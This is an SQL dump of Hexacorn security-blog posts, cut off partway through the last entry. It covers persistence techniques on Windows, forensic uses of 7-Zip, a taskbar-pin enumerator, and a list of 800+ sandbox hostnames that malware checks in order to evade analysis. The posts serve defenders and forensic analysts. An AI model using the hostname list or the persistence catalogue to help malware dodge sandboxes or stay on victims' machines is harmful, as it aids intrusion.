INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (210, 'Permanent Link to Beyond good ol’ Run key, Part 32', 'Hexacorn', 'September 12, 2015 ', 'Here are some more persistence tricks combined into a single post. I normally don’t post links, but sometimes it really makes sense and here is one of such cases. The below is a list of links covering many interesting persistence mechanisms that popped up on my radar and I don’t want to write about them in separate blog entries as others already did a great job researching and covering them – lots of very interesting concepts covered here:\n\nWindows Platform Binary Table (very clever persistence mechanism used by Lenovo and HP)\n\nhttp://seclists.org/bugtraq/2015/Aug/44\nhttp://download.microsoft.com/download/8/A/2/8A2FB72D-9B96-4E2D-A559-4A27CF905A80/windows-platform-binary-table.docx\nhttp://alex-ionescu.com/Publications/SyScan/syscan2012.pdf\n\n\nPhantom DLL loading – MSDTC/oci.dll\n\nhttps://www.fireeye.com/blog/threat-research/2012/08/hikit-rootkit-advanced-persistent-attack-techniques-part-1.html\nhttp://blog.trendmicro.com/trendlabs-security-intelligence/shadow-force-uses-dll-hijacking-targets-south-korean-company\n\n\nBIOS Computrace persistence mechanism\n\nhttps://securelist.com/analysis/publications/58278/absolute-computrace-revisited/\nhttp://bartblaze.blogspot.com/2014/11/thoughts-on-absolute-computrace.html\n\n\nFile modification a.k.a. trojanizing (typically system) binaries (patching of the import table to add extra DLL)\n\nhttp://blog.trendmicro.com/trendlabs-security-intelligence/attack-gains-foothold-against-east-asian-government-through-auto-start/\n\n\nWindows 8 lsasrv.dll allows you to load some arbitrary .dll inside lsass process\n\nhttp://redplait.blogspot.com/2015/02/lsasrvdlllsaploadlsadbextensiondll.html (this is a very good reversing blog and worth following it)\n\n\nWMI persistence (also including persistence using Managed Object Format (MOF))\n– the below is a list of WMI-related documents that are a must-read & cover persistence as well\n\nhttp://la.trendmicro.com/media/misc/understanding-wmi-malware-research-paper-en.pdf\nhttp://2014.hackitoergosum.org/slides/day1_WMI_Shell_Andrei_Dumitrescu.pdf\nhttps://dl.mandiant.com/EE/library/MIRcon2014/MIRcon_2014_IR_Track_There’s_Something_About_WMI.pdf\nhttps://media.defcon.org/DEF%20CON%2023/DEF%20CON%2023%20presentations/Matt%20Graeber%20&%20Willi%20Ballenthin%20&%20Claudio%20Teodorescu/DEFCON-23-Ballenthin-Graeber-Teodorescu-WMI-Attacks-Defense-.pdf\nhttps://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf\nhttps://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf\nhttps://github.com/fireeye/flare-wmi\nhttps://msdn.microsoft.com/en-us/library/aa823192%28v=vs.85%29.aspx\nhttp://www.codeproject.com/Articles/28226/Creating-WMI-Permanent-Event-Subscriptions-Using-M\nhttp://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html\nhttps://khr0x40sh.wordpress.com/2014/06/10/moftastic_powershell/\nhttps://khr0x40sh.wordpress.com/2015/01/13/meterpreter-post-module-persistence-via-mofpowershell/\n\n\n\n\nCOM Object hijacking (persistence mechanisms discussed on this blog previously but here are good examples of it being used by the actual malware)\n\nhttps://blog.gdatasoftware.com/blog/article/com-object-hijacking-the-discreet-way-of-persistence.html\nhttp://blog.trendmicro.com/trendlabs-security-intelligence/poweliks-levels-up-with-new-autostart-mechanism/\n\n\nPersistence via Application Compatibility Database (SDB) (Application Compatibility fixes (Fix It Patches) / Shim Database / Hot Patching persistence)\n\nhttps://www.blackhat.com/docs/asia-14/materials/Erickson/WP-Asia-14-Erickson-Persist-It-Using-And-Abusing-Microsofts-Fix-It-Patches.pdf\nhttps://www.youtube.com/watch?v=SVqiDdVS7Wo\n\n\nNot really a persistence mechanism, but the write-up for malware that establishes persistence only during the system shutdown/reboot events\n\nhttp://labs.bitdefender.com/2015/08/dridex-now-targets-romania-revives-word-macro-infection-technique/\n\n\nUsing Windows Script Host to maintain persistence by launching Java Script\n\nhttps://www.fireeye.com/blog/threat-research/2014/02/ground-windows-scripting-host-wsh.html\n\n\nPersistence via Language Bar Add-in (Microsoft\\CTF\\LangBarAddin)\n\nhttp://forum.sysinternals.com/autoruns-missing-dlls-loaded-with-langbaraddin-key_topic25190.html\nhttps://www.fireeye.com/blog/threat-research/2013/02/its-a-kind-of-magic-1.html\n\n\nPersistence Through Shell Extension Handlers\n\nhttp://herrcore.blogspot.com.tr/2015/06/malware-persistence-with.html\n\n\nVery good list of persistence mechanisms\n\nhttp://jumpespjump.blogspot.com/2015/05/many-ways-of-malware-persistence-that.html\n\n\nTotally not Windows-related, but very interesting extension of the whole ‘collect all autorun entries’ series – list of MAC OS/X autostart entries\n\nhttp://www.forensicartifacts.com/2015/08/mac-os-x-autorun-locations/\n\n\n\nUpdate\nAfter I posted this entry redp (author of http://redplait.blogspot.com blog) pinged me (thanks!) to add one more item I missed:\n\nRPC Extensions\nstarting with Windows 7 rpcrt4.dll and RpcEpMap.dll enumerate HKLM\\Software\\Microsoft\\Rpc\\Extensions and load them\n\nhttp://redplait.blogspot.ru/2011/04/rpc-extensions.html\nhttp://forum.sysinternals.com/rpc-extensions_topic25896.html\n\n\n\nUpdate 2016\n\nOne more entry from the Adapt Forward web site:\n\nNetshell helper DLLs\n\nhttp://www.adaptforward.com/2016/09/using-netshell-to-execute-evil-dlls-and-persist-on-a-host/\n\n\n\nUpdate 2017\n\nTurns out the Netshell helper DLLs have been already discussed online in 2010 and 2013 (Thx Stefan K.)\n\nUpdate 2017 #2\n\nPersistence via Outlook\n\nhttps://enigma0x3.net/2014/10/14/persistence-using-microsoft-outlook/\n\n\nPersistence via Microsoft Add-ins\n\nhttps://labs.mwrinfosecurity.com/blog/add-in-opportunities-for-office-persistence/\n\n\n\nUpdate 2017 #3\n\nPersistence via Bitsadmin – this is a very creative and not well-known! Thx 3gstudent  – I got so interested that described it here\n\nhttps://github.com/3gstudent/bitsadminexec\n\n\n\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2015/09/12/beyond-good-ol-run-key-part-32/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (211, 'Permanent Link to Sailing on the Seven Zips – its few less-known tricks & a trick to trick it into d', 'Hexacorn', 'September 9, 2015 ', '7zip is an awesome tool and recently its new version (15.06 beta) has been released. While most of us typically use it as a handy (and free) replacement for both free and commercial zip and rar compressors it has a lot more to offer to file carvers and reversers. In this post I will demo a few things you can do with 7z that you might have never heard of.\nIf you are curious about the title, it’s a reference to an old school song by OMD.\nPE files\n7Zip treats PE files as containers and allows us to extract parts of it, including:\n\nsections\n.tls\ncertificates\nappended data\n\nthat is, if you want to extract a certificate (signature) from the PE file you just need to run:\n7z x <filename> CERTIFICATE\nWhen you extract certificate this way, you still need to strip first 8 bytes before it can be parsed to produce meaningful ASN output, but it’s still very handy f.ex. for extracting strings from it.\nIf you want to extract appended data, you need to type:\n7z x <filename>  [0]\nAnother handy option is ‘l’ which is listing objects that 7z finds inside a given container.\nWhen used on the PE file, it gives not only a list of whats inside (sections, etc.), but also produces some info about PE file characteristics f.ex.:\n\nIs it a 32- or 64- bit executable\nIs it CLI or GUI executable\nSection and File alignments\nCode, Data size\nLinker version\nOS version required to run the program\nVersion info\netc.\n\nThis may come handy if you don’t have access to some tools and 7z is available (typical IR function in large companies :).\nThe below is what it shows for notepad.exe (from Windows 7):\nThere is also an option ‘-slt’ that can be added to the ‘l’ command which will give more information about each object listed with ‘l’.\nNullsoft Installers\nOne of the most interesting functions of 7z is ability to unpack Nullsoft installers. This functionality was present in older versions of 7zip, then if memory serves me right was removed for quite some time. Now it seems to be back (although extraction of the script doesn’t seem to be possible as it was in older versions).\nRunning:\n7z l Wireshark-win32-1.12.7.exe\n(on latest version of 32-bit Nullsoft installer for Wireshark)\ncan give us a nice list of files inside the installer.\nRunning\n7z x Wireshark-win32-1.12.7.exe\nextracts all the files, including Nullsoft plug-ins.\nThis is actually very useful. Let’s remember that some installers for malware include not only the payload, but also malicious plug-ins. They can’t be found on the file system after the installation as they are extracted to TEMP folder, loaded and immediately deleted after they are no longer needed. If you do manual analysis you need to ‘catch’ them before they are deleted; with 7z you can extract them directly from the installer and can do analysis.\nCalculating hashes\nAnother handy feature of 7z is ability to calculate hashes of files. Again, may come useful in an environment where you can’t use other tools.\nTo calculate hashes of the file you need to run the following command:\n7z h -scrc* <filename>\nThe switch’s name is a bit misleading (suggesting CRC), but it basically tells 7z to calculate a hash, or a checksum. The default is CRC32, but the following are available:\n\nCRC32\nSHA1\nSHA256\nCRC64\nBLAKE2sp\n\nIf you use an asterisk, all of them will be included:\nWhy Md5 is not on the list is a mystery to me.\nThe list of all hash types, as well as file formats and codecs in your version of 7z can be listed using the ‘7z i’ command.\nAccess to raw physical drive and volumes\nI left this one to the end, as it is pretty cool, but has one caveat.\nAccording to the documentation 7Zip Manager allows to view (and potentially even parse) raw volumes.\nTo access this functionality one needs to open 7Zip Manager as an admin and access the \\\\.  folder.\nwhere you should see a list of drives + physical devices:\nUnfortunately, it doesn’t work for C: and you will always receive the following message:\nIf this gets fixed at source it may become a handy raw file extractor.\nStill, it’s pretty cool.\nWhy?\nCouple of reasons.\n\nReason #1\n\nBecause it works for other drives which are not in use.\n\n\nReason #2\n\nBecause command line tool (7z) also supports it.\n\n\nReason #3\n\nBecause I will show you how to make it work with C: \n\n\n\nSo, what can we do with it?\nLet’s start with a demo for a drive NOT in use.\nWe can f.ex. list the files on the drive by using the following command\n7z l \\\\.\\k:\nThis will give us a list of all files on that drive extracted directly from $MFT:\nUsing the file naming convention shown on the screenshot, we can extract the $MFT file using the following command:\n7z x \\\\.\\k: [SYSTEM]\\$MFT\nPretty useful, isn’t?\nNow, how to make it work for C:?\nSince it works for other volumes it should for C: a well (principles for all live $MFT parsers are similar). After quick analysis I discovered that the author(s) of 7zip made a mistake in the way they open the volume. They call CreateFile with the parameters that prevent other applications from accessing the volume for writing and this obviously causes a problem for C: drive which is constantly in use.\nThe parameter in question is dwShareMode of the CreateFile function. In order to open a volume one has to specify both FILE_SHARE_READ and FILE_SHARE_WRITE, basically allowing other processes/system components to access the device. Authors(s) of 7z only use FILE_SHARE_READ.\nKnowing what’s wrong we can fix it. You can either recompile 7z, or just do a quick binary patch.\nI will show you the binary patch as it’s really quick.\nFILE_SHARE_READ is equal to 1 and FILE_SHARE_WRITE is equal to 2, so the proper argument for CreateFile needs to be a sum of them: FILE_SHARE_READ + FILE_SHARE_WRITE = 3.\nTo locate where the change the binary, the easiest is to make a breakpoint on CreateFileW in ollydbg, then wait for it to hit on \\\\.\\c:, and then step down to the procedure which actually sets the parameters for the function.\nThen you can also go back to IDA Pro to see the actual code of the function which is shown below:\nPatching\nor      al, 1 ;  FILE_SHARE_READ\nlocated at 00406839 to\nor      al, 3 ;  FILE_SHARE_READ + FILE_SHARE_WRITE\nallows us to make it work for drive C: as seen on the below screenshot (taken from Windows XP):\nYou can follow the same process for 64-bit binary.\nShare this :)', 'File Formats ZOO, Forensic Analysis, Incident Response, Malware Analysis, Reversing', 'http://www.hexacorn.com/blog/2015/09/09/sailing-on-the-seven-zips-its-few-less-known-tricks-a-trick-to-trick-it-into-doing-more-tricks/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (212, 'Permanent Link to PinEnum', 'Hexacorn', 'September 6, 2015 ', 'In the old post Beyond good ol’ Run key, Part 9 from March 2014 I mentioned a tool called pinenum.exe. I forgot to add it to that post and it was sitting there unwanted and forgotten until recently someone asked me about it, so here it is for your downloading pleasure.\nThe tool is using an undocumented IID_IPinnedList interface (CLSID = BBD20037-BC0E-42F1-913F-E2936BB0EA0C) to enumerate paths that items pinned to the taskbar (Windows 7+) point to.\nShare this :)', 'Incident Response, pinenum, Software Releases', 'http://www.hexacorn.com/blog/2015/09/06/pinenum/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (213, 'Permanent Link to Enter Sandbox – part 8:  All those… host names… will be lost, in time, like tears…', 'Hexacorn', 'August 25, 2015 ', 'Update 2017-12-18\n\nAdded a list of sandbox names from the ‘The Adventures of AV and the Leaky Sandbox’ preso [PDF] by SafeBreach Labs\nRemoved ‘wscript.shell’ name that was accidentally added to the list\n\nOld post (2015-08-25)\nAnalysis of malware often lead to discovery of anti-sandbox tricks. Many of them rely on long lists of ‘known sandbox computer names’ (i.e. computer network names given to sandboxes) and ‘known sandbox user names’ (i.e. user names for accounts under which sandbox executes samples).\nThe topic of exploiting sandbox frameworks in order to reveal their secrets is not new and many malware-related forums discuss them in details. In this short post I am dropping a bunch (800+) of host names that are commonly recognized by malware as sandboxish. I gathered it over a couple of years from sample analysis, posts online, my own research on various malware forums and lists I got from other people. There may be certainly errors in this list, but I made any effort possible to ensure it is correct. I do not own any copyright on it, but… lots of work went into it – if you want to use it in a commercial product, courses, slides – at least mention where you got it from. Thanks \nIn any case, if you own them, it’s time for randomization, because some malware samples already know them!\n074evbxgva9hgql\n093954\n0e2e44df465c41a\n0m9p60j5w-pc\n1-57aa74bec7f14\n1281412f6b\n141700\n1c213c79d1\n25-5f69a00d9b64\n333333\n675052\n6cf004c2543846a\n724536\n7qts0m12600mtvt\n9015045e99a846d\n928100\na-think\na113b083ad3342d\na52018701\nabc-dd731ae3a20\nabc-win7\nabc-xp\nabdon\nacer-ex\nacme-997999da9b\nad-europe-1\nadier-pc\nadm\nadm2\nadmin\nadmin-4ee07168e\nadmin-85a7bf2c3\nadmin-b2619d2d3\nadmin-de9cb88bb\nadmin-pc\nadminist-722bce\nadriano\nadriano-pc\nagnaldo-pc\nahnlab-ffa1203f\nahnlabmds\nailton-pc\nalam-wahla-pc\nalanwak-pc\nalberto-pc\nalcimar-suexp\nalejandro-pc\nalessandra-pc\nalessandro-pc\nalessandro-pc1\nalex-pc\nalexandre-pc\nalexandro-pc\nalexpassamani\nalfredo-pc\nalgo-bddc445bd1\nali\naline-060da2530\nalinebarreto-pc\nallandsonwesley\nalone\namb01\namd\nanaclaudia-win\nanderson-pc\nandre-pc\nandreluiz-pc\nandrey-pc\nandreza-pc\nandroid\nandréluiz-pc\nangelarita\nangy\nanna-client-59\nanna-cws311\nantonia\nantonie\nantony\nantony-pc\napiary7-pc\napto44\narachonpc\narlisson-yagami\narthur-pc\nasd-vp-test\nasim-pc\nassistsocial\nast-001\nauto\nbaixajat-906443\nbal02\nbalbino-pc\nbanco_01\nbarreto-f3a0ac5\nbb-01-14\nbb-03-21\nbb-04-66\nbd-urlsclav6\nbd-urlsclav9\nbenevide-lpix7n\nbento-pc\nberon\nbesouro-pc\nbespawl\nbeto\nbeton-rats1\nbeton-ratsl\nbiano\nbilly\nblr1-soumyad-v1\nblype\nbolacha-pc\nborel\nbr-taylor-87\nbrbrb-d8fb22af1\nbrenno-pc\nbrian-75445f269\nbriapc\nbrsao0692\nbruna\nbruno\nbruno-e214bfa09\nbruno-pc\nbrunoefamília\nbrunoreis\nbtig-ht\nbuteri-pc\nc02tt18\nc02tt22\nc02tt26\nc02tt36\nc06tt43\nc2f3f0b206c14e9\nca-brian-75\ncaio-pc\ncaixa\ncaixa1\ncameras\ncamila\ncamp-08-pc\ncarlosalberto\ncarlosmello\ncarol-pc\ncarolina-pc\ncarvalho-pc\ncasa\ncasa-010a80cf0b\ncasa-2d7ed3857a\ncasa-pc\ncasa29-pc\ncasaisestaleiro\ncat02-pc\ncdata\ncen_gui_10\ncepa-14\ncesarmello-pc\ncftv\ncgjto-005\nchangeme1\ncharles-3cccf5a\nchintan\nchristia-51e582\ncida-pc\ncidb-pc\ncircumstellar\nclaudemir-pc\nclaudia-pc\nclaudina-pc\nclaudio-pc\nclayton-pc\ncleiton-pc\ncliente\ncliente-1323c95\ncliente-2223686\ncliente-339673e\ncliente-4659bdf\ncliente-6c1119d\ncliente-cec8e04\ncliente-pc\ncliente5518830\nclientrep-pc\ncmas-73f49570c3\ncmdt001\ncntsm5002\ncomp\ncomp-73ac1ec5e6\ncomp-e87d7c32d1\ncomp-home261245be\ncomp10\ncompaq\ncomputad-ea50a5\ncomputador\ncomputador-pc\ncomputer-pc\ncomputer-xxxxxx\ncomputername\nconnect-pc\ncontab-06\ncoro-pc\ncorp089120471\ncpu-47\ncrea-6777291f93\ncris\ncristiano-pc\ncrux\ncssv-lav-melnt\ncti-778ee90c19e\nctsandress\ncuckoo05-2\ncuckoo0801-vm\ncuckoo0806-vm\ncws01_20\ncws02_n29\ncws03_28\ncws04_27\ncws05d205\ncws06d208\ncws09d002\ncws09ex02\ncws10d002\ncws10d007\ncws12d007\ncwsandbox\ncássio-pc\ncélia-pc\ndamiana-pc\ndaniel-pc\ndaniela-pc\ndaniella-hp\ndaniellemendonç\ndanilo-pc\ndany-pc\ndavid-pc\ndbd27012570\ndebora-pc\ndede-pc\ndell-c13c53a412\ndell-d3e62f7e26\ndelta\ndener-pc\ndesktop\ndh4023xp\ndh61ww\ndhianinny-pc\ndiego-pc\ndiegofelix\ndigital-pc\ndijkstra-b459ad\ndinda\ndiogo-2ef6fca36\ndionifer-pc\ndiva-pc\ndnapc\ndocumentos-pc\ndonato-pc\ndono-pc\ndooku01\ndooku02\ndouglas-ae6c0b0\ndrogaria-pc\ndrs-pc\ndt-103\nduda-pc\ndudalina-469862\ndulcina-sti\ndwi-9625ac2e275\nedeilson-pc\nediene\nedithpc\nedmara-pc\nedna-pc\nedson-pc\neduardo-pc\neduardo-win\nelaine\nelaine-pc\nelchante\neleanorepc\nelelson-pc\neletricista-pc\neli-pc\neliasepaty-pc\neliz\nelizange\nelvis-pc\nemerson\nemilia_note\nemiliodias-pc\nequipo\nequipo01\nerick\nescritorio\nescritorio2\nesf-748514fd982\nespecialistas\nestagcoordenada\nestoque\nestudiolf-pc\neverson-pc\nexamplepc\nexpress-860a48f\nfa02conpc18\nfabiana-mega\nfabiana-pc\nfabinho-pc\nfake\nfamilia-pc\nfamiliacabral\nfamilycruzperez\nfanoleoy_dp_ind\nfaster02\nfelipe-pc\nfenix-pc\nfernanda\nfernando-pc\nfigueiredo-pc\nfireeye\nflorianpc\nflytour-pc\nfortinet-5b6acf\nfrederick-pc\ngabbipc\ngabriel82497752\ngabriela-pc\ngabyrodarte\ngabyzona-pc\ngean-397b7cd2f8\ngems-3d59a99f5e\ngenilson\ngeovane-1551e38\ngeral-b1c99ac61\ngerencia-pc\ngerenciador\ngerenciageral\ngfi-client\ngfi-client5\ngilvan-pc\ngiseleeronaldo\nglauco-pc\ngordinho\ngrafica\ngt-fdccd9a7405d\nguilherme-pc\ngunna-pc\ngustavo\ngustavo-4e92a09\nhans\nhardxp-test\nhayandra-pc\nhbxpeng\nhd8r2jds87rew82\nhelder-pc\nheloisa-pc\nhelsapc\nheros\nhome\nhome-1afd6d458b\nhome-6eca5ee0b6\nhome-off-d5f0ac\nhome-pc\nhome1\nhoney\nhost-932c51a1d7\nhp\nhp30512952714\nhppavilion-pc\nhudson-pc\nice\nicec-pc\nigor-pc\nimpressora-pc\ninfo-1a42164f8b\ninfornet-3b9e72\ninventarios\nioavm\niracema-pc\nisabella-272349\nitautec-pc\nivaldo-sti\nivis-pc\njaime-pc\njanaina-pc\njanettedoe\njeferson-2c60e6\njeff-pc\njessica\njessica-pc\njfserv\njhonata-pc\njhonatas-pc\njhonatta-fc85e2\njhow\njoe-\njoe-8a81c76c9df\njohn-pc\njohnson-pc\njonas-pc\njonatham-pc\njonathan-c561e0\njorge-almeida\njoripc\njosecarlos01\njoseluiz\njoseroberto-pc\njosicléia-pc\njoséadelmo-pc\njp-patricia\njuan-pc\njuceli-pc\njuliano-pc\njulyano-pc\njunior-pc\nkaik-hp\nkamilosoft\nkamino\nkarine-4b483d0c\nkayky\nkhune-pc\nkide-pc\nkinho-pc\nkl-pc\nklone-pc\nklone_x64-pc\nlab\nlab-fe8333022ab\nlailla-pc\nlair-lair-pc\nlalo\nlan04\nlaptop\nlarissa-win\nlazaro\nlecio-pc\nlego-02\nleh-hp\nlemos-pc\nlenovo01\nleo\nleonardo\nleonardo-607757\nlespino-pzr\nlika-pc\nlilian-0450a94e\nliliane-sti\nlite\nlivia-pc\nlogatti-0415d02\nlopes-pc\nluan-pc\nluannarosa-pc\nluis\nluisbaggio-pc\nlula\nluser-pc\nluziene-pc\nléia-pc\nm-5842fbb816684\nm3\nmachine_name\nmagdo-pc\nmahmood-pc\nmajaslam-pc\nmalekal\nmalvapc\nmamepc\nmanoel-pc\nmaq05\nmaq30-ana\nmaquina1\nmaquina10\nmarcelino\nmarcelo\nmarcelo-d936308\nmarcelo-pc\nmarcia-pc\nmarcio-285c334d\nmarcio-pc\nmarcosaurelio\nmarcowillma\nmariaeliza-pc\nmarilene\nmarineuza-pc\nmario-pc\nmarta\nmauro-64217af1b\nmauro-ad6cc462b\nmax\nmaykemoraes\nme-pc\nmedeiros-pc\nmelissa-pc\nmichael-f156cf7\nmichele\nmichelleailton\nmicro-casa\nmicro-pc\nmicro004\nmicro02\nmicro07\nmicro20\nmicrosof-3cde6c\nmicrosof-be1a00\nmiki-pc\nmilerson\nmip-xp-cht\nmiraely-pc\nmirella-tecno\nmoacir-pc\nmorte+\nmr-computer\nmypc\nmy_pc_home\nna-win\nnageral-pc\nnazareth-pc\nnb00023-ar\nneide-6950231e6\nneila-pc\nnelson-pc\nneopc\nnew775\nniko-pc\nnone-dusez58jo1\nnot-325\nnote01\nnote03\nnoteasus\nnotebm-pc\nnotebook\nnotebook_vika\nnova-pc\nntblucas\nnunes-pc\nnuria\no-92cc2a5742b94\noem-9ecf19511ee\noffice-d\noficina03gh\noi-d9cc29398c70\noi-pc\nok-pc\nopala-ascnet\norlando-pc\nos2019-pc\noscar06\npablo\npabola-ccf85bc5\npalmeiras-mega\npan-1e6ecc1f78b\nparticul-3d9849\nparticul-c1a251\nparticul-ec6138\nparticular-pc\npatricia-9mprqb\npatriciagurgel\npaulo-pc\npaulocesar-pc\npc\npc-05\npc-10-15\npc-1central\npc-2\npc-2423eb1b5d14\npc-4a095e27cb\npc-71cfa7a097c7\npc-7c18ad05454e\npc-aaf7dbdc1907\npc-fffdcbe8f2bd\npc-jp\npc-pc\npc-user\npc0\npc01-camila\npc02\npc06\npc1\npc11545\npc2\npc220-michael\npc4\npc5\npc8\npc9\npcrodrigo\npcsuporte\npcum\npcvista\npcwe\npc_coord02\npedrinho\npedrosa\npeixe\nperry-pc\npersonal-pc\npessoal\npessoal-2863f28\npessoal-e151137\npessoal-pc\npetraschauff-pc\npierre-0a6da9db\nping-78a0089269\nplacehol-6f699a\nplat-1df898110e\npositivo-ba00dc\npresidência-pc\nprofessores\npronaf2\npublic-ea8367e7\nquad-pc\nquarto\nqumica_rita\nr-pc\nrafael\nrafael-pc\nraissa-pc\nraphaelcosta\nrats-pc\nrecepcao6\nrecepcion\nrecepção\nregina-20130606\nreginaldo-pc\nreplik4tor\nresidenc-f47065\nresidencia\nreynapc\nrh\nrh-00\nricardo-pc\nrodrigo-pc\nrodrigo-vaio\nroger-pc\nrogeriocapaz\nrogeriomaq\nrogilene-pc\nrogérioejully\nron-ac13bf686b1\nroot-98563fe0cb\nroot-9a37cb520d\nroot-d\nrosana-pc\nrosesouza-pc\nrsa0\nrswt-win7-32-00\nruan-pc\nruizinho\nruth-pc\ns3-002\nsa17-testxp\nsacada3\nsafira1-pc\nsala1\nsalita\nsalut\nsam-nb\nsamlab\nsamuel\nsanches-pc\nsandbox\nsandra-mega\nsandro\nsc14_23\nsc15_01\nscscs<u)ws##pw\nsdd-pc\nsecgoverno\nsec_edu\nselda-38a0c09e5\nsergio-679a5b36\nserver\nservidor\nservidor-a546b3\nservtec-41daf81\nseven-pc\nsharaipc\nshawl-pc\nshawl-vaio\nshimelly-fb6099\nshimohiro-pc\nsidnei-pc\nsimone-pc\nsincoder-b046f9\nsincoder-zzzzzz\nsiraj-hp\nsmk®\nsos-a456b0343ef\nsoufoda-pc\nsp3\nspacebr-pc\nsportrenie\nspurtive\nstarter-pc\nsti\nstop\nsuene-80951215f\nsulene-pc\nsupport\nsusana-hp\nsvj03\ntadeu-pc\ntamires\ntata\ntatiana-pc\ntato-pc\ntayeh-pc\ntel11s1a0\ntequilaboomboom\nterminal05\ntespc0\ntespc09\ntest-2f0ddd7e5f\ntest-pc\ntestpc0\nthatiane-pc\nthorsten-f495f3\ntiaguinhoo-pc\ntime6\ntitan\ntraxpall\ntvmcom\ntz\nuelisson-pc\nuelitonbad-pc\nultramed-02\nurls-windowsref\nuser\nuser-2a6e79da98\nuser-307b6f9098\nuser-30d30d6468\nuser-4b0c7e4c46\nuser-55f6b64612\nuser-69d0983294\nuser-7add3c5ffa\nuser-8994620187\nuser-a03bc07abf\nuser-b9d8d85c48\nuser-pc\nuser201\nusername\nuserpc\nuserpc336346446\nuserpcccccccccc\nusu-40afa2bad72\nusuario\nusuario-23eef58\nusuario-acb1418\nusuario-bb903fa\nusuario-pc\nusuario-vaio\nusuarios-a17a00\nusuário\nusuário-pc\nutilizador-vaio\nvalter\nvaléria-pc\nvanciefancie\nvanderle-1bb433\nvani-6ed3c14093\nvania-pc\nvanusa-pc\nvarfileinfo\nvendedor\nvia07\nvictor-pc\nvideo\nvip05-pc\nvirtual\nvirtual-7\nvirtual-win7\nvirtual-xp\nvirtualxp-56529\nvista\nvista-real2\nvistaexperience\nvm-pc\nvmg-client\nvmg_client\nvm_winxp\nvpsvst01\nvs_version_info\nvv\nvwin7-maltest\nvwin7pro-maltest\nvwinxp-mailtest\nvwinxp-maltest\nvwinxppro-maltest\nwanderson-pc\nwellington\nwellingtonramos\nwilbert-sc1310\nwilbert-sc1724\nwilbert-sc2006\nwilbert-sc2201\nwilbert-sc2403\nwilbert-sc2511\nwilliam-pc\nwilson-pc\nwin-e7ejc94fkp6\nwin-ehu9f33g4as\nwin-lrg949qld21\nwin-u9elnvppad0\nwin7-maltest\nwin7-pc\nwin7even-pc\nwin7pro-mailtest\nwin7pro-maltest\nwindows-pc\nwindows7-pc\nwindowshost02\nwindowshost04\nwindowshost06\nwindowshost07\nwindowsxp-sp2\nwinxp\nwinxp-maltest\nwinxp01\nwinxphostname\nwinxppro-maltest\nwinxpsp3\nwinxpsp3x32\nwinxp_re\nwko105\nwks-029\nwolf\nworkstation\nwrightpc\nx-pc\nxanny\nxjoybook54\nxp-449dffbc2bd5\nxp-c374c7c20a7d\nxp-ps3\nxp-silo5yeiykex\nxp-soak1\nxp-sp3-template\nxp1001\nxp1002\nxp3-host01\nxpamas07\nxpamas08\nxpamas09\nxpc\nxpsp2-4f417033d\nxpsp2-9c443b10c\nxs946t04f78kkmi\nxx-pc\nxxxxx-437226f51\nxyoreu\nyour-5d270b6669\nyuri-pc\nz-235\nzalo-pc\nzgxtiqtg8837952\nShare this :)', 'Compromise Detection, Forensic Analysis, Malware Analysis, Sandboxing', 'http://www.hexacorn.com/blog/2015/08/25/enter-sandbox-part-8-all-those-host-names-will-be-lost-in-time-like-tears-in-rain/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (214, 'Permanent Link to Craving for time? Carve some timestamps out… – TimeCraver v0.1', 'Hexacorn', 'August 22, 2015 ', 'Analysis of binary data is always challenging. Data can be encrypted, encoded, and stored in a number of proprietary formats. Understanding of what data represents and how it is stored is non-trivial. It typically involves either analysis of the code that writes stuff to a file, or trying our luck by guessing what is a possible structure of the actual data. The typical approach is to simply look at it and its properties.\nThis can involve checking its entropy and how it changes over the file, looking for patterns typically associated with popular compression algorithms, attempting to brute-force various trivial encryption algos, checking if any data is recognized as a string, Unicode string, localized string, a potential absolute or relative offset to other data, or maybe a byte-, word-, dword- long length preceding data etc.\nOne of the most popular tools that is used to analyze unknown data is binwalk and it helped me on many occasions by providing hints on what is possibly ‘in the file’. Sometimes, even if it didn’t recognize anything interesting was also a good hint – typically meaning encryption, or something really unusual/proprietary.\nExisting tools are always handy, but I can’t count how many quick & dirty (and often completely stupid) scripts I wrote to get some data to look more ‘reasonable’ and ‘normal’.\nIn today’s post I am showing a simple example of such ‘unknown data analysis script’.\nWhen we see a binary file, we typically run ‘strings’ on them and we gather a nice readable ‘printable’ data for analysis.The ‘non-printable’ is also interesting though, so another tool I often run is a strings-like script that carves timestamps out. This comes handy for smaller files, especially for these that look like a config, a quarantine, and anything really that looks like may have  a potential timestamps embedded in it.\nCarving works following a simple rule – read 4/8 bytes, convert it to an epoch using various conversion algos (based on assumed timestamp format), see if epoch converts to a date between years 2000-2015, and if it does – just print it out, together with the offset and some extra metadata.\nExample:\n     00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F   0123456789ABCDEF\r\n---------------------------------------------------------------------------\r\n00 : 80 86 F6 34 00 C0 5D CE 56 CF CD 01 00 40 FA 13   ...4..].V....@.. 00\r\n10 : 0F 00 CE 01 00 40 8B B7 0F 16 CE 01 00 80 59 DA   .....@........Y. 16\r\n20 : 6B 2E CE 01 00 00 BE D2 FE 45 CE 01 00 A4 03 01   k........E...... 32\r\n30 : 85 95 C2 01                                       ....             36\nLooking at such binary data doesn’t give us much useful information.\nRunning timecraver over it, gives us the following:\n===========================================\r\n TimeCraver v0.1, Hexacorn.com, 2015-08-23\r\n===========================================\r\n00000000,DOSTIME ,44C257B0,2006-07-22 16:52:00,8086F634\r\n00000004,FILETIME,50B94880,2012-12-01 00:00:00,00C05DCE56CFCD01\r\n0000000A,EPOCH   ,400001CD,2004-01-10 13:44:45,CD010040\r\n0000000C,FILETIME,510B0580,2013-02-01 